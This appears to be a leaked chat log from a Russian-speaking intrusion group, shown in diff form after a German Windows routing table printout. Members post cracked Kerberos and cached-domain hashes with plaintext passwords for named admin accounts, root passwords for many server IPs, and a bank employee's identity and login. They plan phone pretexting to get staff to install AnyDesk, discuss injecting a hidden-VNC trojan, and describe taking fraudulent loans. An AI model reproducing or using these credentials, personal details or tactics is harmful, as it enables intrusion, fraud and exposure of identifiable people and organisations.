+14...30 f6 ef 3d 15 3e ......Bluetooth Device (Personal Area Network)
+1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4-Routentabelle
+===========================================================================
+Aktive Routen:
+Netzwerkziel    Netzwerkmaske          Gateway    Schnittstelle Metrik
+0.0.0.0          0.0.0.0    192.168.178.1   192.168.178.75     30
+127.0.0.0        255.0.0.0   Auf Verbindung         127.0.0.1    331
+127.0.0.1  255.255.255.255   Auf Verbindung         127.0.0.1    331
+127.255.255.255  255.255.255.255   Auf Verbindung         127.0.0.1    331
+192.168.178.0    255.255.255.0   Auf Verbindung    192.168.178.75    286
+192.168.178.75  255.255.255.255   Auf Verbindung    192.168.178.75    286
+192.168.178.255  255.255.255.255   Auf Verbindung    192.168.178.75    286
+224.0.0.0        240.0.0.0   Auf Verbindung         127.0.0.1    331
+224.0.0.0        240.0.0.0   Auf Verbindung    192.168.178.75    286
+255.255.255.255  255.255.255.255   Auf Verbindung         127.0.0.1    331
+255.255.255.255  255.255.255.255   Auf Verbindung    192.168.178.75    286
+===========================================================================
+Ständige Routen:
+Keine
+
+IPv6-Routentabelle
+===========================================================================
+Aktive Routen:
+If Metrik Netzwerkziel             Gateway
+12    286 ::/0                     fe80::de15:c8ff:fe57:61e1
+1    331 ::1/128                  Auf Verbindung
+12    286 2001:9e8:478d:6c00::/56  fe80::de15:c8ff:fe57:61e1
+12    286 2001:9e8:478d:6c00::/64  Auf Verbindung
+12    286 2001:9e8:478d:6c00:6d0e:f5ae:6d7:2a3b/128
+Auf Verbindung
+12    286 2001:9e8:478d:6c00:8e00:e97d:3a01:cbad/128
+Auf Verbindung
+12    286 fe80::/64                Auf Verbindung
+12    286 fe80::3559:ae45:dc5e:f313/128
+Auf Verbindung
+1    331 ff00::/8                 Auf Verbindung
+12    286 ff00::/8                 Auf Verbindung
+===========================================================================
+Ständige Routen:
+Keine
+
+C:\Users\thoever>
+```
+--------------------
+[2024-06-19 15:26:48] @mel:artronica.rocks: давай доработаем список
+--------------------
+[2024-06-19 15:26:51] @mel:artronica.rocks: может повезет
+--------------------
+[2024-06-19 15:30:29] @lincoln:artronica.rocks: аккаунт мертвый )
+--------------------
+[2024-06-19 15:30:40] @usernamegg:matrix.bestflowers247.online: еще )
+--------------------
+[2024-06-19 15:30:52] @usernamegg:matrix.bestflowers247.online: Ghocks_ulan (3).zip
+--------------------
+[2024-06-19 15:30:52] @usernamegg:matrix.bestflowers247.online: Ghocks_ulan (4).zip
+--------------------
+[2024-06-19 15:30:55] @lincoln:artronica.rocks: https://prnt.sc/30cvicFT8O9u
+--------------------
+[2024-06-19 15:31:04] @lincoln:artronica.rocks: удалилась она и этот аккаунт мертвый
+--------------------
+[2024-06-19 15:31:52] @muaddib6:matrix.org: +
+--------------------
+[2024-06-19 15:32:54] @lincoln:artronica.rocks: что еще у нас есть
+--------------------
+[2024-06-19 15:34:02] @mel:artronica.rocks: сейчас сделаю
+--------------------
+[2024-06-19 15:35:43] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 15:35:54] @usernamegg:matrix.bestflowers247.online: я закинул им новые файлы
+--------------------
+[2024-06-19 15:36:11] @burito:matrix.bestflowers247.online: Ок
+--------------------
+[2024-06-19 15:41:25] @usernamemm:matrix.bestflowers247.online: `$DCC2$10240#admin.fs#fe992b5d18ba94e2471298fd4839c18c`
+--------------------
+[2024-06-19 15:41:38] @usernamejj:matrix.bestflowers247.online: krb5_2.txt
+--------------------
+[2024-06-19 15:44:19] @usernameboy:matrix.bestflowers247.online: $krb5tgs$23$*ADMMPSSDELLING$ONE.GX.LOCAL$one.gx.local/ADMMPSSDELLING*$ad5b481724...efc:Cashflow33!
+$krb5tgs$23$*ADMBUE1DHOELLING$ONE.GX.LOCAL$one.gx.local/ADMBUE1DHOELLING*$b16d6d...b0e94fe:Bmw32025
+$krb5tgs$23$*ADMBUE1FBRUENING$ONE.GX.LOCAL$one.gx.local/ADMBUE1FBRUENING*$db3e78...8da5ded:Buende123
+
+--------------------
+[2024-06-19 15:44:32] @usernamejj:matrix.bestflowers247.online: > <@usernameboy:matrix.bestflowers247.online> $krb5tgs$23$*ADMMPSSDELLING$ONE.GX.LOCAL$one.gx.local/ADMMPSSDELLING*$ad5b481724...efc:Cashflow33!
+> $krb5tgs$23$*ADMBUE1DHOELLING$ONE.GX.LOCAL$one.gx.local/ADMBUE1DHOELLING*$b16d6d...b0e94fe:Bmw32025
+> $krb5tgs$23$*ADMBUE1FBRUENING$ONE.GX.LOCAL$one.gx.local/ADMBUE1FBRUENING*$db3e78...8da5ded:Buende123
+
+++
+--------------------
+[2024-06-19 15:45:50] @mel:artronica.rocks: через 15 минут стартуем
+--------------------
+[2024-06-19 15:48:15] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 15:48:23] @lincoln:artronica.rocks: жарень
+--------------------
+[2024-06-19 15:48:53] @usernameugway:matrix.bestflowers247.online: я не смог оплатиь карты не подходят, попробуую иначе
+--------------------
+[2024-06-19 15:50:42] @muaddib6:matrix.org: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+Готово
+--------------------
+[2024-06-19 15:51:01] @muaddib6:matrix.org: строка:
+jGsyXKpZ8Cr7HY9JcWDnNwtSx3VUA2EaR4gBe6uhmdvbkTQz5P
+--------------------
+[2024-06-19 15:51:38] @muaddib6:matrix.org: 5.7z
+--------------------
+[2024-06-19 15:52:38] @mel:artronica.rocks: CalumDunlop@sainsburysbankuk.onmicrosoft.com
+--------------------
+[2024-06-19 15:52:51] @mel:artronica.rocks: Calum Dunlop
+--------------------
+[2024-06-19 15:54:02] @mel:artronica.rocks: IT Incident Analyst
+--------------------
+[2024-06-19 15:54:05] @mel:artronica.rocks: погнали
+--------------------
+[2024-06-19 15:54:15] @lincoln:artronica.rocks: скинь пасс
+--------------------
+[2024-06-19 15:54:30] @mel:artronica.rocks: aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 15:56:17] @usernameboy:matrix.bestflowers247.online: $krb5tgs$23$*ADMMPSTRAUCH$ONE.GX.LOCAL$one.gx.local/ADMMPSTRAUCH*$d2f3////b991a:Leopard2a4!b
+
+--------------------
+[2024-06-19 15:56:30] @usernamejj:matrix.bestflowers247.online: > <@usernameboy:matrix.bestflowers247.online> $krb5tgs$23$*ADMMPSTRAUCH$ONE.GX.LOCAL$one.gx.local/ADMMPSTRAUCH*$d2f3////b991a:Leopard2a4!b
+
+++
+--------------------
+[2024-06-19 15:57:57] @usernameyy:matrix.bestflowers247.online: пароль
+--------------------
+[2024-06-19 15:58:07] @usernameyy:matrix.bestflowers247.online: Han:
+--------------------
+[2024-06-19 15:58:54] @usernamehunter:matrix.bestflowers247.online: > <@usernamemm:matrix.bestflowers247.online> `BUCHERHYDRAULICS.COM/ProbstG:077088f2e594efa73c417f2a8cf0e8eb:ProbstG`
+
+077088f2e594efa73c417f2a8cf0e8eb:probstg:270822Marlon
+
+--------------------
+[2024-06-19 15:59:15] @usernamemm:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 15:59:58] @lincoln:artronica.rocks: поехали
+--------------------
+[2024-06-19 16:00:20] @muaddib6:matrix.org: У меня пока не заходит. Делаю дальше.
+--------------------
+[2024-06-19 16:01:30] @muaddib6:matrix.org: "C:\Users\username\AppData\Roaming\Pandora hVNC.exe" файл себя копирует сюда и работает от сюда. Мне для того что бы запустить его с инфицированрго нативного файла нужно его выполнить в дотнет процессе для этого я его инжектирую в стороний процес, однако если файл себя будет копировать, то вместо инфицированого файла скопируется стронний файл. Можно поправить исходник?  Если убрать копирования в папку, я сам могу добавить копирование в эту директории с именем Pandora hVNC.exe
+--------------------
+[2024-06-19 16:01:59] @usernameyy:matrix.bestflowers247.online: это не наш софт
+--------------------
+[2024-06-19 16:08:21] @lincoln:artronica.rocks: они заблокировали
+--------------------
+[2024-06-19 16:09:16] @lincoln:artronica.rocks: спам уже потушили как-то
+--------------------
+[2024-06-19 16:10:07] @lincoln:artronica.rocks: я понимаю
+--------------------
+[2024-06-19 16:10:10] @mel:artronica.rocks: с чего ты взял?
+--------------------
+[2024-06-19 16:10:15] @lincoln:artronica.rocks: и да я делаю все чтоб установить anydesk
+--------------------
+[2024-06-19 16:10:20] @lincoln:artronica.rocks: ну только что общался
+--------------------
+[2024-06-19 16:10:33] @mel:artronica.rocks: много еще контактов осталось?
+--------------------
+[2024-06-19 16:10:37] @mel:artronica.rocks: много прозвонил?
+--------------------
+[2024-06-19 16:10:42] @lincoln:artronica.rocks: 10-15
+--------------------
+[2024-06-19 16:10:45] @lincoln:artronica.rocks: я думаю 10
+--------------------
+[2024-06-19 16:10:49] @lincoln:artronica.rocks: но они уже все уходят
+--------------------
+[2024-06-19 16:10:50] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 16:10:52] @lincoln:artronica.rocks: с работы
+--------------------
+[2024-06-19 16:10:58] @mel:artronica.rocks: добьем список?
+--------------------
+[2024-06-19 16:11:04] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 16:11:06] @lincoln:artronica.rocks: нужен лид
+--------------------
+[2024-06-19 16:11:06] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 16:11:08] @lincoln:artronica.rocks: конечно добьем
+--------------------
+[2024-06-19 16:12:26] @lincoln:artronica.rocks: в поезде уже многие
+--------------------
+[2024-06-19 16:12:28] @lincoln:artronica.rocks: делаю дальше
+--------------------
+[2024-06-19 16:15:55] @burito:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> Ghocks_ulan (3).zip
+
+строка PHwOzkGTHiixvPFCKzsnQoQYYdccGM
+--------------------
+[2024-06-19 16:15:55] @burito:matrix.bestflowers247.online: ulan3.zip
+--------------------
+[2024-06-19 16:19:33] @burito:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> Ghocks_ulan (4).zip
+
+rundll32.exe dll.dll,MainFunc
+строка DETJthvGharSnJSalDnsJyOMhyNPkY
+--------------------
+[2024-06-19 16:19:33] @burito:matrix.bestflowers247.online: ulan.zip
+--------------------
+[2024-06-19 16:21:56] @lincoln:artronica.rocks: тишина
+--------------------
+[2024-06-19 16:22:01] @lincoln:artronica.rocks: все уехали уже мел
+--------------------
+[2024-06-19 16:22:13] @ugw:artronica.rocks: завтра продолжим
+--------------------
+[2024-06-19 16:22:20] @ugw:artronica.rocks: еще раз мжно пройтись по этому списку бдует
+--------------------
+[2024-06-19 16:22:23] @ugw:artronica.rocks: и новые сделаем
+--------------------
+[2024-06-19 16:22:28] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 16:22:33] @mel:artronica.rocks: до завтра
+--------------------
+[2024-06-19 16:22:37] @lincoln:artronica.rocks: давай-те
+--------------------
+[2024-06-19 16:22:46] @lincoln:artronica.rocks: как вы ?
+--------------------
+[2024-06-19 16:22:55] @ugw:artronica.rocks: завтра с 12
+--------------------
+[2024-06-19 16:22:58] @ugw:artronica.rocks: юк и потом юсу
+--------------------
+[2024-06-19 16:23:03] @lincoln:artronica.rocks: тот что сегодня один сделали через cmd
+--------------------
+[2024-06-19 16:23:12] @lincoln:artronica.rocks: получилось что-то или нет ?
+--------------------
+[2024-06-19 16:23:25] @ugw:artronica.rocks: если про квик -  не получилсоь
+--------------------
+[2024-06-19 16:23:48] @lincoln:artronica.rocks: отлично
+--------------------
+[2024-06-19 16:23:52] @lincoln:artronica.rocks: ну завтра тогда полный газ
+--------------------
+[2024-06-19 16:23:58] @lincoln:artronica.rocks: сегодня реально мог бы поставить 5-6
+--------------------
+[2024-06-19 16:24:01] @lincoln:artronica.rocks: прям были моменты
+--------------------
+[2024-06-19 16:24:06] @lincoln:artronica.rocks: просто все заблокировано
+--------------------
+[2024-06-19 16:24:06] @ugw:artronica.rocks: квик еще раз тестанем - есть вопросы к нему
+--------------------
+[2024-06-19 16:24:25] @lincoln:artronica.rocks: он удобен, когда все в блоке
+--------------------
+[2024-06-19 16:24:27] @lincoln:artronica.rocks: как вариант
+--------------------
+[2024-06-19 16:24:40] @lincoln:artronica.rocks: но видишь не подходит
+--------------------
+[2024-06-19 16:25:23] @usernamemm:matrix.bestflowers247.online: `$DCC2$10240#admin.mike#3b33753f8dce30ea1483a9b60e73b988`
+--------------------
+[2024-06-19 16:25:36] @lincoln:artronica.rocks: спасибо
+--------------------
+[2024-06-19 16:25:39] @lincoln:artronica.rocks: завтра продолжим
+--------------------
+[2024-06-19 16:25:43] @usernamemm:matrix.bestflowers247.online: `$DCC2$10240#admin.tim#7ae569e2166af00d8c3082aebf77d990`
+
+--------------------
+[2024-06-19 16:25:49] @lincoln:artronica.rocks: а что интереснее
+--------------------
+[2024-06-19 16:25:53] @lincoln:artronica.rocks: uk или usa
+--------------------
+[2024-06-19 16:25:58] @lincoln:artronica.rocks: больше ?
+--------------------
+[2024-06-19 16:29:45] @usernameyy:matrix.bestflowers247.online: ulan3.ex
+--------------------
+[2024-06-19 16:29:45] @usernameyy:matrix.bestflowers247.online: ulan.dll
+--------------------
+[2024-06-19 16:30:32] @usernameyy:matrix.bestflowers247.online: Archive.zip
+--------------------
+[2024-06-19 16:35:59] @ugw:artronica.rocks: юса
+--------------------
+[2024-06-19 16:36:03] @ugw:artronica.rocks: канада
+--------------------
+[2024-06-19 16:39:57] @lincoln:artronica.rocks: работаем
+--------------------
+[2024-06-19 16:40:00] @lincoln:artronica.rocks: всем спасибо )
+--------------------
+[2024-06-19 16:53:34] @usernamegg:matrix.bestflowers247.online: давай я сделаю
+--------------------
+[2024-06-19 16:56:06] @usernamegg:matrix.bestflowers247.online: тут ?
+--------------------
+[2024-06-19 16:56:25] @usernamegg:matrix.bestflowers247.online: Данные от акка скинь от тимвивера
+--------------------
+[2024-06-19 16:56:29] @usernamegg:matrix.bestflowers247.online: чтобы пропалтить
+--------------------
+[2024-06-19 16:56:38] @usernamegg:matrix.bestflowers247.online: * чтобы купить подписку нам
+--------------------
+[2024-06-19 16:56:42] @usernamegg:matrix.bestflowers247.online: я сделаю сам
+--------------------
+[2024-06-19 16:57:02] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 16:57:13] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 17:01:02] @usernamegg:matrix.bestflowers247.online: ```
+41
+45.141.87.170
+root
+i]PBe6sX~2K3]&5
+
+42
+45.141.87.27
+root
+Lc_phLBY61R;.*/
+
+43
+45.141.87.172
+root
+gZWi1MwEW9?tu!:
+
+44
+45.141.87.167
+root
+mqY\i9h{VzO\#1P
+
+45
+45.141.87.168
+root
+t(m<oe4VT&y<\1(
+
+46
+45.141.87.183
+root
+/{qR=Lk,Lq–=iu5
+
+47
+45.141.87.189
+root
+mc5_}4!821N/Tyb
+
+48
+45.141.87.194
+root
+l22YS8P2+I@UWoq
+
+49
+45.141.87.195
+root
+ajgUk4,G,<G<G>:
+
+50
+45.141.87.200
+root
+8T~tj#bG7S2RItV
+```
+--------------------
+[2024-06-19 17:22:35] @usernamett:matrix.bestflowers247.online: kekhash.txt
+--------------------
+[2024-06-19 17:38:29] @usernamegg:matrix.bestflowers247.online: photo_2024-06-19 20.38.18.jpeg
+--------------------
+[2024-06-19 17:41:47] @usernamegg:matrix.bestflowers247.online: photo_2024-06-19 20.40.18.jpeg
+--------------------
+[2024-06-19 17:41:51] @usernamegg:matrix.bestflowers247.online: это платформа для бухгалтерии, если корпа с историей - берут лоаны и выводят на свои счета
+--------------------
+[2024-06-19 18:02:12] @usernameugway:matrix.bestflowers247.online: давай, у меня карты не принимает
+--------------------
+[2024-06-19 18:02:22] @usernameugway:matrix.bestflowers247.online: ну то есть он принмает но не приходят смс
+--------------------
+[2024-06-19 18:09:47] @mel:artronica.rocks: да, сейчас скину
+--------------------
+[2024-06-19 18:10:11] @mel:artronica.rocks: Leyla Bertic
+creds gmx.net + teamviewer
+learela@gmx.net
+aa112JKHVF*&2ssss
+
+recovery mail: Mail.tm
+learela@navalcadets.com
+aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 18:10:36] @mel:artronica.rocks: он стоит на дедике 94.131.112.42
+--------------------
+[2024-06-19 18:22:07] @muaddib6:matrix.org: > <@usernameyy:matrix.bestflowers247.online> sent a file.
+
+Готово
+--------------------
+[2024-06-19 18:22:36] @muaddib6:matrix.org: строка:
+jGsyXKpZ8Cr7HY9JcWDnNwtSx3VUA2EaR4gBe6uhmdvbkTQz5P
+--------------------
+[2024-06-19 18:22:56] @muaddib6:matrix.org: 6.7z
+--------------------
+[2024-06-19 18:24:30] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 18:27:21] @usernameugway:matrix.bestflowers247.online: https://www.dwservice.net/en/home.html
+--------------------
+[2024-06-19 18:27:24] @usernameugway:matrix.bestflowers247.online: завтра тестанем
+--------------------
+[2024-06-19 18:27:28] @usernameugway:matrix.bestflowers247.online: может норм
+--------------------
+[2024-06-19 18:29:28] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 18:29:29] @usernamegg:matrix.bestflowers247.online: давай
+--------------------
+[2024-06-19 18:29:51] @usernamegg:matrix.bestflowers247.online: > <@usernameugway:matrix.bestflowers247.online> https://www.dwservice.net/en/home.html
+
+ищи. софт который не от админа запускать
+--------------------
+[2024-06-19 18:29:59] @usernamegg:matrix.bestflowers247.online: я буду сокс пока делать который по днсу будет стучать
+--------------------
+[2024-06-19 18:30:04] @usernamegg:matrix.bestflowers247.online: и надо делать инфектный
+--------------------
+[2024-06-19 18:32:11] @usernamegg:matrix.bestflowers247.online: ```
+51
+77.221.146.2
+root
+kZUy3(3+$J!QO[k
+
+52
+77.221.146.3
+root
+M}AV{Y@#K<^7cvE
+
+53
+77.221.146.4
+root
+])~O{6G9FItOdbH
+
+54
+77.221.146.5
+root
+gQ*wKd#6cX#tn>M
+
+
+55
+77.221.146.6
+root
+bJ5.#)x+3D*$B;Z
+
+
+56
+77.221.146.7
+root
+m$V+cSvEo&3PY~j
+
+
+57
+77.221.146.8
+root
+cwO[1H/6iUB7y!V
+
+
+58
+77.221.146.9
+root
+p0~,{}9lyB)SpDa
+
+59
+77.221.146.11
+root
+L72&O6=yA9L:*_k
+
+60
+77.221.146.12
+root
+!:Ek3CnK3=/j=#,
+```
+--------------------
+[2024-06-19 18:32:43] @usernamegg:matrix.bestflowers247.online: завтра последние 40 отдадим из 100
+
+итого опередили даже срок  :)
+--------------------
+[2024-06-19 18:33:22] @lapa:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> завтра последние 40 отдадим из 100
+>
+> итого опередили даже срок  :)
+
+ага)
+--------------------
+[2024-06-19 18:33:33] @lapa:matrix.bestflowers247.online: ну ладно, вручную походу делают
+--------------------
+[2024-06-19 18:33:42] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 19:31:57] @cameron777:matrix.org: privet
+--------------------
+[2024-06-19 19:31:58] @cameron777:matrix.org: vi na otdixe uzhe ?
+--------------------
